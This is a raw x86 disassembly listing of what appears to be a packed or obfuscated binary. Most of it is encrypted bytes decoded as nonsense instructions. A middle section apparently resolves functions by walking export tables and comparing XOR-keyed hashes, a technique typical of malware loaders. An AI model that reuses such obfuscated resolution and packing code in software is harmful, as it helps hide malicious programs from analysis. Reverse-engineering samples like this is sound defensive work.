  4046bd:	ror    BYTE PTR [ebp+0x54f6df52],0x51
  4046c4:	mov    ebx,0x33622695
  4046c9:	sbb    eax,0x719a36c4
  4046ce:	pusha  
  4046cf:	stc    
  4046d0:	(bad)  
  4046d1:	(bad)  
  4046d2:	sbb    ecx,ebp
  4046d4:	cmp    ch,al
  4046d6:	push   ebx
  4046d7:	jl     0x404680
  4046d9:	or     al,0xb
  4046db:	shr    edi,1
  4046dd:	pushf  
  4046de:	dec    ebx
  4046df:	dec    eax
  4046e0:	add    DWORD PTR [edi-0x8e7845f],eax
  4046e6:	lock mov al,ds:0x7a18f62
  4046ec:	xchg   esi,eax
  4046ed:	lods   al,BYTE PTR ds:[esi]
  4046ee:	nop
  4046ef:	aaa    
  4046f0:	sub    ah,ah
  4046f2:	sti    
  4046f3:	xchg   edx,eax
  4046f4:	push   esi
  4046f5:	jne    0x40467a
  4046f7:	imul   esi,DWORD PTR [esi],0x5b
  4046fa:	test   eax,0xd383d237
  4046ff:	add    BYTE PTR [ecx],ch
  404701:	pop    esp
  404702:	shl    DWORD PTR [esi],1
  404704:	cmp    ecx,DWORD PTR [ebx+ecx*2]
  404707:	or     edx,ecx
  404709:	mov    esi,0xe5fceab5
  40470e:	arpl   si,ax
  404710:	in     eax,0x23
  404712:	mov    dh,0x15
  404714:	das    
  404715:	adc    eax,0xab1fcad2
  40471a:	in     al,0xe
  40471c:	jp     0x40476b
  40471e:	push   es
  40471f:	sub    al,0xe1
  404721:	push   ecx
  404722:	pop    ebp
  404723:	cdq    
  404724:	outs   dx,DWORD PTR ds:[esi]
  404725:	packuswb mm0,QWORD PTR [edx+ebp*2+0x49faa70e]
  40472d:	in     eax,0x65
  40472f:	mov    edi,0xff196b21
  404734:	jb     0x4046d8
  404736:	lahf   
  404737:	pop    ecx
  404738:	scas   al,BYTE PTR es:[edi]
  404739:	push   es
  40473a:	mov    eax,0x7b7ae1f2
  40473f:	sub    ebx,esi
  404741:	inc    ecx
  404742:	dec    ebp
  404743:	out    0x33,eax
  404745:	push   cs
  404746:	adc    DWORD PTR [esi-0x39],esp
  404749:	mov    eax,0xc63a44fc
  40474e:	jb     0x4046e5
  404750:	(bad)  
  404751:	clc    
  404752:	mov    BYTE PTR [ecx+0x4c],dh
  404755:	rcl    eax,1
  404757:	lods   eax,DWORD PTR ds:[esi]
  404758:	xchg   edi,eax
  404759:	aaa    
  40475a:	cmp    eax,0xce3f39c5
  40475f:	(bad)  
  404760:	cmp    ebx,edi
  404762:	sub    cl,BYTE PTR [ebx]
  404764:	xchg   edx,eax
  404765:	pop    ebp
  404766:	jmp    0x4f86c32
  40476b:	nop
  40476c:	sub    ecx,0x73975b68
  404772:	pop    eax
  404773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404775:	mov    esi,0x989381e2
  40477a:	bound  esp,QWORD PTR [ebp+0x179687c6]
  404780:	pop    ebp
  404781:	(bad)  
  404783:	push   0x6e
  404785:	ins    DWORD PTR es:[edi],dx
  404786:	xchg   esp,eax
  404787:	xchg   ebx,eax
  404788:	or     eax,0x7b444615
  40478d:	lock repnz sub eax,0xe7f27fe
  404794:	mov    edi,DWORD PTR [ecx]
  404796:	repz fbld TBYTE PTR [ecx+0xa]
  40479a:	out    0xa3,eax
  40479c:	mov    dh,0x4
  40479e:	mov    eax,0x3da01490
  4047a3:	adc    al,0xca
  4047a5:	dec    esi
  4047a6:	ret    0xf8c6
  4047a9:	xchg   edx,eax
  4047aa:	jmp    0x40480d
  4047ac:	jecxz  0x40473e
  4047ae:	sti    
  4047af:	loop   0x4047f5
  4047b1:	out    0xfb,al
  4047b3:	dec    esp
  4047b4:	rcr    bh,cl
  4047b6:	dec    edi
  4047b7:	sub    al,0x13
  4047b9:	outs   dx,BYTE PTR ds:[esi]
  4047ba:	adc    eax,0x80a161f7
  4047bf:	push   ebx
  4047c0:	xor    edx,DWORD PTR [ebx-0x3805adb4]
  4047c6:	and    DWORD PTR [eax-0x66],0xed668039
  4047cd:	mov    ch,BYTE PTR [ecx-0x22]
  4047d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047d1:	(bad)  
  4047d3:	retf   
  4047d4:	lods   eax,DWORD PTR ds:[esi]
  4047d5:	imul   ebx,DWORD PTR [esi+edi*1],0x57
  4047d9:	jno    0x4047c2
  4047db:	push   ecx
  4047dc:	mov    esp,0xde667cee
  4047e1:	mov    esi,0xe23309f8
  4047e6:	dec    esp
  4047e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047e8:	xchg   edx,eax
  4047e9:	dec    eax
  4047ea:	and    dl,ch
  4047ec:	inc    esp
  4047ed:	and    BYTE PTR [ebp-0x7],0xa6
  4047f1:	mov    bh,0xfe
  4047f3:	in     eax,0xfd
  4047f5:	sahf   
  4047f6:	add    BYTE PTR [edi+0x3bfa85db],bh
  4047fc:	sti    
  4047fd:	(bad)  
  4047fe:	mov    ebp,0x1ac1f171
  404803:	xor    eax,DWORD PTR gs:[ecx+0x549c0de2]
  40480a:	popa   
  40480b:	ror    BYTE PTR [ecx+0x68],0x86
  40480f:	sub    eax,DWORD PTR [ebx+0x73c7d8bb]
  404815:	das    
  404816:	cmc    
  404817:	add    esi,eax
  404819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40481a:	sub    al,0x22
  40481c:	push   ebp
  40481d:	jp     0x40486e
  40481f:	not    BYTE PTR [edi-0x5c]
  404822:	add    eax,0x8a905768
  404827:	loope  0x40488f
  404829:	adc    BYTE PTR [esi],0x5c
  40482c:	push   ecx
  40482d:	jns    0x404888
  40482f:	push   ebp
  404830:	sbb    DWORD PTR [esi],ebp
  404832:	xchg   esp,eax
  404833:	lds    esi,FWORD PTR [eax-0x6d6af34b]
  404839:	icebp  
  40483a:	xor    edi,DWORD PTR [ebx+ecx*4+0x36]
  40483e:	test   eax,0x4d2c22ad
  404843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404844:	pop    ss
  404845:	jp     0x404837
  404847:	mov    esi,0xf2a1197c
  40484c:	push   edi
  40484d:	pop    esi
  40484e:	pop    ss
  40484f:	data16 cld 
  404851:	pop    edx
  404852:	cmp    BYTE PTR [ebx+0x64865a5f],al
  404858:	fs loopne 0x40486c
  40485b:	ficom  WORD PTR [ebx-0x2b800081]
  404861:	les    eax,FWORD PTR [eax+0x383b771a]
  404867:	int    0x79
  404869:	sbb    DWORD PTR [ecx],esi
  40486b:	int    0xc1
  40486d:	xchg   ebp,eax
  40486e:	data16 cmp BYTE PTR [eax-0x544707a9],0x58
  404876:	xchg   esi,eax
  404877:	or     ebx,ecx
  404879:	jle    0x404848
  40487b:	icebp  
  40487c:	ins    DWORD PTR es:[edi],dx
  40487d:	jmp    0xadba94a3
  404882:	rcr    BYTE PTR [ecx+edi*1+0x21],1
  404886:	test   DWORD PTR [esi-0x7c],esi
  404889:	loop   0x4048a7
  40488b:	pop    es
  40488c:	push   es
  40488d:	adc    edx,DWORD PTR [edi-0x5a]
  404890:	push   ss
  404891:	mov    edi,0xb66f8ffc
  404896:	sub    eax,0x1f7e84ae
  40489b:	lock mov ds:0xf33cd9fb,al
  4048a1:	outs   dx,BYTE PTR ds:[esi]
  4048a2:	mov    esi,0x45b46bb6
  4048a7:	cs pop ebx
  4048a9:	jge    0x404835
  4048ab:	jge    0x404922
  4048ad:	mov    eax,ds:0x20a8143d
  4048b2:	mov    al,ds:0x8bcd3a85
  4048b7:	cs jle 0x404840
  4048ba:	mov    esi,0x87b1eca1
  4048bf:	and    al,0xc
  4048c1:	iret   
  4048c2:	sbb    ebp,DWORD PTR [ecx]
  4048c4:	js     0x4048db
  4048c6:	imul   ecx,DWORD PTR [ecx],0x0
  4048c9:	adc    eax,0x48c5cd4d
  4048ce:	sbb    dl,BYTE PTR [ebp-0x5d]
  4048d1:	pusha  
  4048d2:	scas   eax,DWORD PTR es:[edi]
  4048d3:	dec    esi
  4048d4:	inc    edi
  4048d5:	outs   dx,DWORD PTR ds:[esi]
  4048d6:	ja     0x404878
  4048d8:	fbstp  TBYTE PTR [eax]
  4048da:	ja     0x404904
  4048dc:	inc    ebx
  4048dd:	xor    ebp,DWORD PTR [esi+0x7e96a265]
  4048e3:	mov    esp,0x16f12ecf
  4048e8:	jne    0x4048d2
  4048ea:	sub    edx,ebp
  4048ec:	jnp    0x404933
  4048ee:	sbb    BYTE PTR [ebx-0xb],al
  4048f1:	retf   0x95be
  4048f4:	scas   al,BYTE PTR es:[edi]
  4048f5:	cdq    
  4048f6:	out    dx,eax
  4048f7:	(bad)  
  4048f8:	ror    BYTE PTR [ecx],cl
  4048fa:	imul   ecx,ebx,0xeabd4bb5
  404900:	daa    
  404901:	imul   ebp,DWORD PTR [eax],0x4bb7b265
  404907:	into   
  404908:	push   edx
  404909:	sub    eax,0x2d9a60cf
  40490e:	int3   
  40490f:	or     eax,0xbb6c4d7b
  404914:	add    ebp,ebx
  404916:	mov    al,0x61
  404918:	pop    es
  404919:	jno    0x40498b
  40491b:	retf   
  40491c:	or     eax,0x81a8df55
  404921:	ret    0xa8da
  404924:	inc    edi
  404925:	(bad)  
  404926:	test   al,0x7c
  404928:	mov    ds:0x10a66f76,eax
  40492d:	gs in  eax,0xb5
  404930:	and    eax,0x4f8a495d
  404935:	je     0x404980
  404937:	dec    edx
  404938:	xor    al,0xa8
  40493a:	xor    al,0x29
  40493c:	jmp    0xa431:0x52441d05
  404943:	rcl    BYTE PTR [edi],0x23
  404946:	loopne 0x4049bc
  404948:	pop    ebp
  404949:	mov    edx,0xbeb5827e
  40494e:	jbe    0x4049a5
  404950:	retf   0x5777
  404953:	jns    0x404986
  404955:	jle    0x404918
  404957:	push   es
  404958:	test   DWORD PTR [esi],edx
  40495a:	adc    bl,bl
  40495c:	retf   0xf41f
  40495f:	and    edx,DWORD PTR [edi-0x18]
  404962:	into   
  404963:	mov    bl,0x5b
  404965:	aaa    
  404966:	cmp    DWORD PTR [edx],0xffffffd1
  404969:	jae    0x4049a4
  40496b:	arpl   WORD PTR [esp+ebx*1+0x3e],dx
  40496f:	dec    edx
  404970:	stc    
  404971:	jns    0x40492f
  404973:	xchg   ebp,eax
  404974:	xchg   ebx,eax
  404975:	call   0x2a92:0x6b6bfd41
  40497c:	shl    DWORD PTR [esi+0x6b91e80f],0x28
  404983:	mov    bl,0x85
  404985:	outs   dx,BYTE PTR fs:[esi]
  404987:	adc    ch,BYTE PTR ss:[eax]
  40498a:	and    al,0xe0
  40498c:	jmp    ebx
  40498e:	ficom  DWORD PTR [esi]
  404990:	mov    esp,edi
  404992:	jecxz  0x4049d1
  404994:	and    eax,0x5302c799
  404999:	out    0xc0,eax
  40499b:	xchg   ebx,eax
  40499c:	jmp    0xa6a0:0x613fb2f2
  4049a3:	cs loopne 0x4049e1
  4049a6:	ud2    
  4049a8:	scas   al,BYTE PTR es:[edi]
  4049a9:	test   al,0x28
  4049ab:	popa   
  4049ac:	mov    BYTE PTR [eax-0x12],ah
  4049af:	fst    QWORD PTR [ebx]
  4049b1:	call   0x5e98f686
  4049b6:	fistp  WORD PTR [edi]
  4049b8:	lea    esi,[ecx]
  4049ba:	inc    edi
  4049bb:	fdivr  DWORD PTR [edi-0x4f18ffbb]
  4049c1:	push   edi
  4049c2:	outs   dx,DWORD PTR ds:[esi]
  4049c3:	(bad)  
  4049c4:	and    BYTE PTR [ebp+0x36],dh
  4049c7:	aas    
  4049c8:	inc    eax
  4049c9:	cmp    edi,DWORD PTR [esi]
  4049cb:	pop    es
  4049cc:	dec    ecx
  4049cd:	adc    ch,BYTE PTR [esi-0x9]
  4049d0:	jnp    0x404a04
  4049d2:	les    esp,FWORD PTR [esi+0x57]
  4049d5:	loop   0x4049a4
  4049d7:	pop    ebx
  4049d8:	rcr    BYTE PTR [esi],1
  4049da:	ss dec edx
  4049dc:	jae    0x40497c
  4049de:	out    0x2e,al
  4049e0:	cmp    BYTE PTR [esi],dh
  4049e2:	push   ss
  4049e3:	call   0x64b7efb
  4049e8:	retf   0x88c1
  4049eb:	or     DWORD PTR [ebx-0x29],0xdb4b9fec
  4049f2:	sbb    esp,esp
  4049f4:	ins    DWORD PTR es:[edi],dx
  4049f5:	lds    esi,FWORD PTR [ecx-0x5f0ef2a3]
  4049fb:	cmp    BYTE PTR [edi-0x71],0x16
  4049ff:	loop   0x404a2d
  404a01:	stos   DWORD PTR es:[edi],eax
  404a02:	ficomp WORD PTR [edx+0x2d]
  404a05:	pop    ebx
  404a06:	retf   0xc95
  404a09:	mov    eax,ds:0x9c57cb67
  404a0e:	push   eax
  404a0f:	cmp    DWORD PTR [ebx+0x23],esp
  404a12:	inc    ecx
  404a13:	sub    al,dl
  404a15:	and    al,0x3d
  404a17:	stc    
  404a18:	xchg   ebp,eax
  404a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a1a:	sub    eax,0x2689d25a
  404a1f:	mov    eax,0xaa4f46bd
  404a24:	or     DWORD PTR [ebx-0x12b2e8d4],edx
  404a2a:	mov    ebp,0xd5242fcb
  404a2f:	ss pop edi
  404a31:	xor    DWORD PTR [ecx-0x1c670e0f],eax
  404a37:	xlat   BYTE PTR ds:[ebx]
  404a38:	cmp    al,0x1c
  404a3a:	and    DWORD PTR [edi+ecx*2+0x64c0a309],eax
  404a41:	and    al,0x8a
  404a43:	mov    ebx,0x66c3d275
  404a48:	jge    0x404a3a
  404a4a:	gs sbb al,0x8e
  404a4d:	das    
  404a4e:	shr    esi,cl
  404a50:	call   0xb15b4f61
  404a55:	es xchg esp,eax
  404a57:	cmp    BYTE PTR [ebp+0x17fcd2bd],cl
  404a5d:	xchg   DWORD PTR [edx+0x1c],eax
  404a60:	inc    edx
  404a61:	or     BYTE PTR [edi],bl
  404a63:	rol    ch,1
  404a65:	pushf  
  404a66:	das    
  404a67:	mov    bl,0x5c
  404a69:	popa   
  404a6a:	arpl   WORD PTR [esi+0x5c1ea947],dx
  404a70:	ds sti 
  404a72:	jns    0x404aeb
  404a74:	mov    ebp,0x1eaf7e5
  404a79:	push   ss
  404a7a:	pop    ecx
  404a7b:	ins    DWORD PTR es:[edi],dx
  404a7c:	sbb    eax,0xf1ddd29a
  404a81:	test   al,0x89
  404a83:	and    al,0x42
  404a85:	pushf  
  404a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a87:	adc    ah,ch
  404a89:	fistp  DWORD PTR [edi]
  404a8b:	rol    BYTE PTR [eax],1
  404a8d:	in     eax,0x62
  404a8f:	dec    ebp
  404a90:	dec    ecx
  404a91:	call   0x60796716
  404a96:	mov    edi,0x5a2b3b89
  404a9b:	mov    edx,0xf161be1
  404aa0:	inc    ebx
  404aa1:	jmp    0x404a29
  404aa3:	inc    esp
  404aa4:	fisubr WORD PTR [ecx-0x1a39cbc8]
  404aaa:	push   ebx
  404aab:	in     al,0xa2
  404aad:	std    
  404aae:	sub    DWORD PTR [edx],0x16
  404ab1:	inc    ecx
  404ab2:	daa    
  404ab3:	xor    al,0x2
  404ab5:	ss inc ebp
  404ab7:	(bad)  
  404ab8:	les    esp,FWORD PTR [edi+0x2e01aa3f]
  404abe:	repnz sub al,0xc2
  404ac1:	in     eax,dx
  404ac2:	or     al,0x89
  404ac4:	jb     0x404aa2
  404ac6:	lahf   
  404ac7:	pusha  
  404ac8:	prefetchwt1 (bad)
  404ac9:	or     eax,0x6af376d3
  404ace:	and    ecx,DWORD PTR [edi+0x6ed2b559]
  404ad4:	add    edx,edx
  404ad6:	cli    
  404ad7:	inc    ebp
  404ad8:	cmp    ecx,DWORD PTR ds:0xa91dc999
  404ade:	mov    ds:0xc99184d0,al
  404ae3:	sub    eax,DWORD PTR [edx+0x48]
  404ae6:	or     al,0x73
  404ae8:	ret    0xa7e9
  404aeb:	inc    edi
  404aec:	sahf   
  404aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aee:	jle    0x404a85
  404af0:	jg     0x404b68
  404af2:	dec    ecx
  404af3:	imul   dl
  404af5:	outs   dx,BYTE PTR ds:[esi]
  404af6:	dec    edi
  404af7:	addr16 dec ebp
  404af9:	xchg   ecx,eax
  404afa:	adc    esi,DWORD PTR [ebx+0x3bfb8889]
  404b00:	adc    ecx,DWORD PTR [edi]
  404b02:	call   FWORD PTR [ecx]
  404b04:	outs   dx,DWORD PTR ds:[esi]
  404b05:	aaa    
  404b06:	cmp    ch,cl
  404b08:	(bad)  
  404b09:	fldenv [ebx+eiz*4]
  404b0c:	jbe    0x404ae2
  404b0e:	push   edi
  404b0f:	sbb    bh,BYTE PTR [ebx-0x679578e9]
  404b15:	sub    eax,0x998a7963
  404b1a:	(bad)  
  404b1b:	aad    0x99
  404b1d:	xchg   esp,eax
  404b1e:	push   edi
  404b1f:	xlat   BYTE PTR ds:[ebx]
  404b20:	pop    esp
  404b21:	hlt    
  404b22:	pop    ds
  404b23:	jmp    0xca53d21b
  404b28:	jns    0x404b74
  404b2a:	fcomp  DWORD PTR [esp+eax*4-0x38c5fad5]
  404b31:	sahf   
  404b32:	call   FWORD PTR [edx-0x2855c353]
  404b38:	enter  0x4034,0x43
  404b3c:	or     ch,ah
  404b3e:	sbb    edi,DWORD PTR [ecx+0x37dbc3d1]
  404b44:	xchg   ebp,eax
  404b45:	addr16 rol ah,1
  404b48:	push   ss
  404b49:	jo     0x404b7d
  404b4b:	jp     0x404b02
  404b4d:	inc    edx
  404b4e:	in     al,dx
  404b4f:	mov    DWORD PTR [edx-0x7d],edi
  404b52:	jae    0x404afe
  404b54:	and    eax,0x386efa56
  404b59:	cmc    
  404b5a:	xchg   DWORD PTR [edi+edx*4],edx
  404b5d:	hlt    
  404b5e:	data16 jne 0x404bb6
  404b61:	shr    esi,1
  404b63:	ins    BYTE PTR es:[edi],dx
  404b64:	pcmpeqw mm1,QWORD PTR [edx]
  404b67:	and    dl,BYTE PTR fs:[ebx]
  404b6a:	ds cmc 
  404b6c:	sub    DWORD PTR [edi+0x7d58ef33],0x8d23c888
  404b76:	mov    ebp,0x9b78536a
  404b7b:	xchg   BYTE PTR [edi-0x80],cl
  404b7e:	addr16 out 0x73,al
  404b81:	cmp    DWORD PTR [ebp+ecx*2+0x71],ebx
  404b85:	inc    ecx
  404b86:	jnp    0x404b21
  404b88:	ja     0x404be0
  404b8a:	jb     0x404b61
  404b8c:	and    DWORD PTR [eax],esi
  404b8e:	jb     0x404c0a
  404b90:	retf   0xe767
  404b93:	fnstenv [edx-0x7b3bc100]
  404b99:	xor    cl,ch
  404b9b:	aam    0xf2
  404b9d:	cli    
  404b9e:	les    ecx,FWORD PTR [edx-0x487e4f65]
  404ba4:	retf   
  404ba5:	int3   
  404ba6:	xor    eax,0xe3b18295
  404bab:	js     0x404b49
  404bad:	shl    BYTE PTR [edx-0x59],1
  404bb0:	pop    esp
  404bb1:	mov    cl,0xcc
  404bb3:	push   ds
  404bb4:	loopne 0x404ba1
  404bb6:	(bad)  
  404bb7:	pop    ecx
  404bb8:	pop    ss
  404bb9:	aas    
  404bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bbb:	lea    esp,ds:0x77b4db05
  404bc1:	xor    ah,BYTE PTR [ebp-0x6a]
  404bc4:	xchg   BYTE PTR [eax+0x47],cl
  404bc7:	mov    ecx,eax
  404bc9:	xor    al,0xd5
  404bcb:	jb     0x404bae
  404bcd:	lea    edi,[edi]
  404bcf:	mov    dh,0x70
  404bd1:	enter  0xdad5,0xf4
  404bd5:	out    0xa2,eax
  404bd7:	lock and ah,BYTE PTR [ebx+0x6ac23db]
  404bde:	xor    dh,cl
  404be0:	sbb    ebp,ebx
  404be2:	std    
  404be3:	pop    edi
  404be4:	cmp    eax,0xbaec1342
  404be9:	xchg   bh,dh
  404beb:	pop    esi
  404bec:	es mov ah,0x17
  404bef:	add    al,0x8b
  404bf1:	jmp    0x404b78
  404bf3:	sbb    bh,dl
  404bf5:	push   esi
  404bf6:	iret   
  404bf7:	cmp    ecx,eax
  404bf9:	mov    ds:0x5f91fbb8,eax
  404bfe:	shl    dl,1
  404c00:	sbb    ebx,DWORD PTR [esi+esi*8+0x58de8bc5]
  404c07:	sub    esi,eax
  404c09:	mov    esp,0x240347af
  404c0e:	adc    BYTE PTR [ecx],ch
  404c10:	xlat   BYTE PTR ds:[ebx]
  404c11:	addr16 xchg ebx,eax
  404c13:	pop    edx
  404c14:	jge    0x404c1b
  404c16:	cld    
  404c17:	inc    eax
  404c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c19:	xor    eax,0x1c
  404c1c:	fcom   DWORD PTR [ecx-0x55]
  404c1f:	sub    ebp,DWORD PTR [eax]
  404c21:	gs (bad) 
  404c23:	inc    ecx
  404c24:	pushf  
  404c25:	into   
  404c26:	dec    ebp
  404c27:	sbb    al,0xf4
  404c29:	mov    esi,0x4041cbf1
  404c2e:	shl    BYTE PTR [ebp-0x5cc857f],0x91
  404c35:	imul   esp,esp,0xef83a116
  404c3b:	sti    
  404c3c:	int3   
  404c3d:	jo     0x404cb0
  404c3f:	jge    0x404bf4
  404c41:	(bad)  
  404c42:	fsubr  QWORD PTR [ebp+ebx*2+0x19e0879a]
  404c49:	out    0x8b,al
  404c4b:	shr    DWORD PTR [ebx],1
  404c4d:	loop   0x404c5f
  404c4f:	mov    ecx,0xffae7c54
  404c54:	cmc    
  404c55:	dec    ebx
  404c56:	mov    eax,DWORD PTR [ebp-0x4]
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	dec    ebp
  404e97:	ficom  DWORD PTR [eax]
  404e99:	jp     0x404ea5
  404e9b:	pop    edi
  404e9c:	jp     0x404f18
  404e9e:	or     bl,BYTE PTR [edi+0x7a]
  404ea1:	jp     0x404e77
  404ea3:	add    edi,ecx
  404ea5:	jo     0x404eaf
  404ea7:	call   0xdfe3:0x51c77bf9
  404eae:	xchg   esi,eax
  404eaf:	repz popf 
  404eb1:	lea    ebp,[eax-0x61705774]
  404eb7:	jns    0x404f2b
  404eb9:	fisttp QWORD PTR [esi+0x57]
  404ebc:	ins    BYTE PTR es:[edi],dx
  404ebd:	fiadd  DWORD PTR [ebp-0x730154d8]
  404ec3:	stc    
  404ec4:	pop    ebx
  404ec5:	pop    es
  404ec6:	nop
  404ec7:	int    0x8a
  404ec9:	imul   esi,ebp,0xe429b0d8
  404ecf:	(bad)  
  404ed0:	in     eax,0x26
  404ed2:	jae    0x404f38
  404ed4:	and    BYTE PTR [ecx],ah
  404ed6:	retf   0x9724
  404ed9:	adc    al,0xa5
  404edb:	mov    dl,0xf4
  404edd:	jl     0x404ec2
  404edf:	in     al,0xe1
  404ee1:	push   es
  404ee2:	enter  0x5e45,0x3b
  404ee6:	adc    eax,eax
  404ee8:	cmp    DWORD PTR [ebx+ecx*1],esi
  404eeb:	xchg   edx,eax
  404eec:	pusha  
  404eed:	mov    ebx,DWORD PTR [eax]
  404eef:	push   esp
  404ef0:	fdiv   DWORD PTR [ecx]
